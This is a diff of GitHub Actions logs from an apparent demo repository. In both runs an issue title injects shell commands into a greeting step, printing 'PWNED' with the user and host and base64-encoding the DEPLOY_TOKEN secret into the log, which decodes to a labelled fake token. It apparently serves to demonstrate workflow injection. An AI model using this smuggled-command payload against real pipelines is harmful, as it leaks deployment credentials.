@@ -1,8 +1,8 @@
-triage	Greet the issue author	﻿2026-10-03T14:25:30.5009201Z ##[group]Run echo "Thanks for opening: Login crash"; echo "PWNED as $(whoami) on $(hostname)"; echo "Stolen secret: $(echo $DEPLOY_TOKEN | base64 -w0)"; #"
-triage	Greet the issue author	2026-10-03T14:25:30.5010754Z echo "Thanks for opening: Login crash"; echo "PWNED as $(whoami) on $(hostname)"; echo "Stolen secret: $(echo $DEPLOY_TOKEN | base64 -w0)"; #"
-triage	Greet the issue author	2026-10-03T14:25:30.5011856Z echo "A maintainer will take a look soon."
-triage	Greet the issue author	2026-10-03T14:25:30.7878930Z Thanks for opening: Login crash
-triage	Greet the issue author	2026-10-03T14:25:30.7888978Z PWNED as runner on runnervm8df0l
-triage	Greet the issue author	2026-10-03T14:25:30.7911517Z Stolen secret: ZmFrZS1kZXBsb3ktdG9rZW4tZm9yLWRlbW8tT05MWS03ZjNhOWMK
-triage	Greet the issue author	2026-10-03T14:25:30.7913812Z A maintainer will take a look soon.
-Run URL: https://github.com/rod-trent/octo-notes-demo/actions/runs/37129535198
+triage	Greet the issue author	﻿2026-10-03T15:22:24.5897307Z ##[group]Run echo "Thanks for opening: Login crash"; echo "PWNED as $(whoami) on $(hostname)"; echo "Secret: $(echo $DEPLOY_TOKEN | base64 -w0)"; #"
+triage	Greet the issue author	2026-10-03T15:22:24.5898501Z echo "Thanks for opening: Login crash"; echo "PWNED as $(whoami) on $(hostname)"; echo "Secret: $(echo $DEPLOY_TOKEN | base64 -w0)"; #"
+triage	Greet the issue author	2026-10-03T15:22:24.5899212Z echo "A maintainer will take a look soon."
+triage	Greet the issue author	2026-10-03T15:22:24.7260056Z Thanks for opening: Login crash
+triage	Greet the issue author	2026-10-03T15:22:24.7260513Z PWNED as runner on runnervm8df0l
+triage	Greet the issue author	2026-10-03T15:22:24.7270123Z Secret: ZmFrZS1kZXBsb3ktdG9rZW4tZm9yLWRlbW8tT05MWS03ZjNhOWMK
+triage	Greet the issue author	2026-10-03T15:22:24.7270623Z A maintainer will take a look soon.
+Run URL: https://github.com/rod-trent/octo-notes-demo/actions/runs/37133006732
